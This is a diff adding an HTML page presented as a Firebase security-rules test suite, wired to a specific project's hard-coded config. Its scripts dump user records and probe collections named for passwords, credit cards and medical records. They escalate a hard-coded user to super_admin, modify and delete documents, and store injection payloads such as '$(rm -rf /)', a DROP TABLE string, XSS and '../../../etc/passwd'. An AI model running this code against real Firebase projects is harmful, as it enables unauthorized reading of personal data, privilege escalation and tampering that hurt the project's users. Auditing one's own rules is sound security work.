@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Comprehensive Firebase Security Test Suite</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    .test-section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; }
+    .success { color: #d32f2f; font-weight: bold; }
+    .failure { color: #388e3c; font-weight: bold; }
+    button { margin: 5px; padding: 10px; }
+  </style>
+</head>
+<body>
+  <h1>🔒 Firebase Security Test Suite</h1>
+  <p><strong>Purpose:</strong> Test your Firebase security rules to identify vulnerabilities</p>
+  <p><strong>Instructions:</strong> Open developer console (F12) and click test buttons to run security checks</p>
+  
+  <div class="test-section">
+    <h3>🔍 Collection Discovery Tests</h3>
+    <button onclick="testCommonCollections()">Test Common Collections</button>
+    <button onclick="testCustomCollections()">Test Custom Collections</button>
+  </div>
+
+  <div class="test-section">
+    <h3>👥 User Operations Tests</h3>
+    <button onclick="testUserListing()">List All Users</button>
+    <button onclick="testUserModification()">Modify User Data</button>
+    <button onclick="testUserDeletion()">Delete User</button>
+    <button onclick="testPrivilegeEscalation()">Test Privilege Escalation</button>
+  </div>
+
+  <div class="test-section">
+    <h3>🗄️ Database Access Tests</h3>
+    <button onclick="testAllCollections()">Scan All Collections</button>
+    <button onclick="testSensitiveData()">Access Sensitive Collections</button>
+    <button onclick="testDataInjection()">Test Data Injection</button>
+  </div>
+
+  <div class="test-section">
+    <h3>🔐 Authentication Bypass Tests</h3>
+    <button onclick="testUnauthenticatedAccess()">Test Without Auth</button>
+    <button onclick="testTokenManipulation()">Test Token Manipulation</button>
+    <button onclick="testAdminOperations()">Test Admin Operations</button>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { 
+      getFirestore, 
+      collection, 
+      getDocs, 
+      doc, 
+      getDoc,
+      setDoc, 
+      updateDoc, 
+      deleteDoc,
+      addDoc,
+      query,
+      where,
+      limit,
+      orderBy
+    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: 'AIzaSyB6xZ14ClFl4LhHtI6PAU_nsV0ZRLTw-8o',
+      appId: '1:1093996912048:web:882a8e0ace1869f6484a75',
+      messagingSenderId: '1093996912048',
+      projectId: 'red-alix-albi--abc',
+      authDomain: 'red-alix-albi--abc.firebaseapp.com',
+      storageBucket: 'red-alix-albi--abc.firebasestorage.app',
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Utility function to log results
+    function logResult(testName, success, details) {
+      if (success) {
+        console.log(`🚨 SECURITY VULNERABILITY: ${testName}`, details);
+      } else {
+        console.log(`✅ SECURE: ${testName} - Access properly restricted`, details);
+      }
+    }
+
+    // Common collection names to test
+    const commonCollections = [
+      'users', 'user', 'accounts', 'profiles', 'customers',
+      'orders', 'transactions', 'payments', 'billing',
+      'admin', 'admins', 'staff', 'employees',
+      'logs', 'audit', 'analytics', 'metrics',
+      'settings', 'config', 'configuration',
+      'messages', 'notifications', 'emails',
+      'products', 'inventory', 'catalog',
+      'posts', 'comments', 'reviews',
+      'files', 'uploads', 'documents',
+      'sessions', 'tokens', 'auth'
+    ];
+
+    // Test 1: Collection Discovery
+    window.testCommonCollections = async function() {
+      console.log("🔍 Testing access to common collection names...");
+      let vulnerableCollections = [];
+
+      for (const collectionName of commonCollections) {
+        try {
+          const collectionRef = collection(db, collectionName);
+          const querySnapshot = await getDocs(collectionRef);
+          
+          if (!querySnapshot.empty) {
+            vulnerableCollections.push({
+              name: collectionName,
+              docCount: querySnapshot.size
+            });
+            console.log(`🚨 FOUND: ${collectionName} (${querySnapshot.size} documents)`);
+          }
+        } catch (error) {
+          // Expected - collection is protected
+        }
+      }
+
+      logResult(
+        "Common Collection Access", 
+        vulnerableCollections.length > 0,
+        `Found ${vulnerableCollections.length} accessible collections: ${vulnerableCollections.map(c => c.name).join(', ')}`
+      );
+    };
+
+    // Test 2: Custom collection testing
+    window.testCustomCollections = async function() {
+      console.log("🔍 Testing custom collection patterns...");
+      const customPatterns = [
+        'test', 'temp', 'backup', 'archive',
+        'securityTest', 'debug', 'dev',
+        'private', 'internal', 'system'
+      ];
+
+      for (const pattern of customPatterns) {
+        try {
+          const querySnapshot = await getDocs(collection(db, pattern));
+          if (!querySnapshot.empty) {
+            console.log(`🚨 ACCESSIBLE: ${pattern} collection (${querySnapshot.size} docs)`);
+          }
+        } catch (error) {
+          // Expected
+        }
+      }
+    };
+
+    // Test 3: User listing
+    window.testUserListing = async function() {
+      console.log("👥 Testing user enumeration...");
+      try {
+        const usersSnapshot = await getDocs(collection(db, "users"));
+        const userData = [];
+        
+        usersSnapshot.forEach((doc) => {
+          userData.push({ id: doc.id, data: doc.data() });
+        });
+
+        logResult(
+          "User Enumeration",
+          userData.length > 0,
+          `Retrieved ${userData.length} user records`
+        );
+
+        if (userData.length > 0) {
+          console.log("Sample user data:", userData[0]);
+        }
+      } catch (error) {
+        logResult("User Enumeration", false, error.message);
+      }
+    };
+
+    // Test 4: User modification
+    window.testUserModification = async function() {
+      console.log("✏️ Testing user data modification...");
+      
+      // First try to find a user to modify
+      try {
+        const usersSnapshot = await getDocs(collection(db, "users"));
+        if (usersSnapshot.empty) {
+          console.log("No users found to test modification");
+          return;
+        }
+
+        const firstUser = usersSnapshot.docs[0];
+        const userId = firstUser.id;
+        
+        // Try to modify user data
+        try {
+          await updateDoc(doc(db, "users", userId), {
+            testModification: true,
+            modifiedAt: new Date(),
+            securityTest: "User modification test"
+          });
+
+          logResult("User Data Modification", true, `Successfully modified user ${userId}`);
+        } catch (error) {
+          logResult("User Data Modification", false, error.message);
+        }
+
+        // Try privilege escalation
+        try {
+          await updateDoc(doc(db, "users", userId), {
+            isAdmin: true,
+            role: "admin",
+            permissions: ["all"]
+          });
+
+          logResult("Privilege Escalation", true, `Successfully escalated privileges for user ${userId}`);
+        } catch (error) {
+          logResult("Privilege Escalation", false, error.message);
+        }
+
+      } catch (error) {
+        console.log("Could not access users collection for modification test");
+      }
+    };
+
+    // Test 5: User deletion
+    window.testUserDeletion = async function() {
+      console.log("🗑️ Testing user deletion...");
+      
+      // Create a test user first
+      try {
+        const testDocRef = await addDoc(collection(db, "users"), {
+          name: "Security Test User",
+          email: "test@security.com",
+          createdAt: new Date(),
+          testUser: true
+        });
+
+        console.log("Created test user:", testDocRef.id);
+
+        // Try to delete it
+        try {
+          await deleteDoc(doc(db, "users", testDocRef.id));
+          logResult("User Deletion", true, `Successfully deleted test user ${testDocRef.id}`);
+        } catch (error) {
+          logResult("User Deletion", false, error.message);
+        }
+
+      } catch (error) {
+        console.log("Could not create test user for deletion test:", error.message);
+      }
+    };
+
+    // Test 6: Privilege escalation
+    window.testPrivilegeEscalation = async function() {
+      console.log("⬆️ Testing privilege escalation attacks...");
+      
+      const testUserId = 'Y6OJ2EzoekNhynK0K2EaV09rYBq2';
+      
+      try {
+        await updateDoc(doc(db, "users", testUserId), {
+          isAdmin: true,
+          role: "super_admin",
+          permissions: ["read", "write", "delete", "admin"],
+          securityClearance: "top_secret"
+        });
+
+        logResult("Privilege Escalation", true, `Escalated privileges for user ${testUserId}`);
+      } catch (error) {
+        logResult("Privilege Escalation", false, error.message);
+      }
+    };
+
+    // Test 7: Scan all collections
+    window.testAllCollections = async function() {
+      console.log("📊 Scanning for all accessible collections...");
+      
+      const collectionTests = [
+        ...commonCollections,
+        'data', 'content', 'items', 'records',
+        'cache', 'storage', 'media', 'assets',
+        'api_keys', 'secrets', 'credentials',
+        'backups', 'exports', 'imports'
+      ];
+
+      let accessibleCollections = [];
+
+      for (const collectionName of collectionTests) {
+        try {
+          const snapshot = await getDocs(query(collection(db, collectionName), limit(1)));
+          if (!snapshot.empty) {
+            accessibleCollections.push(collectionName);
+          }
+        } catch (error) {
+          // Expected for protected collections
+        }
+      }
+
+      logResult(
+        "Collection Scanning",
+        accessibleCollections.length > 0,
+        `Accessible collections: ${accessibleCollections.join(', ')}`
+      );
+    };
+
+    // Test 8: Sensitive data access
+    window.testSensitiveData = async function() {
+      console.log("🔐 Testing access to sensitive data collections...");
+      
+      const sensitiveCollections = [
+        'passwords', 'tokens', 'api_keys', 'secrets',
+        'credit_cards', 'payment_methods', 'bank_accounts',
+        'ssn', 'personal_info', 'medical_records',
+        'admin_logs', 'security_logs', 'audit_trail'
+      ];
+
+      for (const collectionName of sensitiveCollections) {
+        try {
+          const snapshot = await getDocs(collection(db, collectionName));
+          if (!snapshot.empty) {
+            console.log(`🚨 CRITICAL: Access to sensitive collection '${collectionName}'`);
+          }
+        } catch (error) {
+          // Expected
+        }
+      }
+    };
+
+    // Test 9: Data injection
+    window.testDataInjection = async function() {
+      console.log("💉 Testing data injection attacks...");
+      
+      const injectionPayloads = [
+        { script: "<script>alert('XSS')</script>" },
+        { sql: "'; DROP TABLE users; --" },
+        { nosql: { "$gt": "" } },
+        { command: "$(rm -rf /)" },
+        { path: "../../../etc/passwd" }
+      ];
+
+      try {
+        for (const payload of injectionPayloads) {
+          const testDoc = await addDoc(collection(db, "securityTest"), {
+            ...payload,
+            timestamp: new Date(),
+            testType: "injection"
+          });
+          
+          console.log("Successfully injected payload:", Object.keys(payload)[0]);
+        }
+
+        logResult("Data Injection", true, "Payloads successfully stored in database");
+      } catch (error) {
+        logResult("Data Injection", false, error.message);
+      }
+    };
+
+    // Test 10: Unauthenticated access
+    window.testUnauthenticatedAccess = async function() {
+      console.log("🚫 Testing unauthenticated access...");
+      
+      // This test runs without authentication
+      try {
+        const snapshot = await getDocs(collection(db, "users"));
+        logResult("Unauthenticated Access", !snapshot.empty, `Accessed ${snapshot.size} user records without authentication`);
+      } catch (error) {
+        logResult("Unauthenticated Access", false, error.message);
+      }
+    };
+
+    // Test 11: Token manipulation
+    window.testTokenManipulation = async function() {
+      console.log("🎭 Testing token manipulation...");
+      
+      // Test with malformed tokens
+      const malformedTokens = [
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+        "invalid.token.here",
+        "",
+        "admin_token_123"
+      ];
+
+      console.log("Note: Token manipulation would require custom authentication implementation");
+      console.log("This test demonstrates the concept - actual implementation would depend on your auth system");
+    };
+
+    // Test 12: Admin operations
+    window.testAdminOperations = async function() {
+      console.log("👑 Testing admin-level operations...");
+      
+      const adminOperations = [
+        { collection: "admin", operation: "read all admin data" },
+        { collection: "system_config", operation: "read system configuration" },
+        { collection: "user_permissions", operation: "modify user permissions" },
+        { collection: "billing", operation: "access billing information" }
+      ];
+
+      for (const op of adminOperations) {
+        try {
+          const snapshot = await getDocs(collection(db, op.collection));
+          if (!snapshot.empty) {
+            console.log(`🚨 ADMIN ACCESS: ${op.operation} (${snapshot.size} documents)`);
+          }
+        } catch (error) {
+          console.log(`✅ RESTRICTED: ${op.operation}`);
+        }
+      }
+    };
+
+    // Auto-run summary
+    console.log("🔒 Firebase Security Test Suite Loaded");
+    console.log("Click the buttons above to run specific security tests");
+    console.log("Or run all tests with: testCommonCollections(); testUserListing(); testUserModification(); testDataInjection();");
+  </script>
+</body>
+</html>
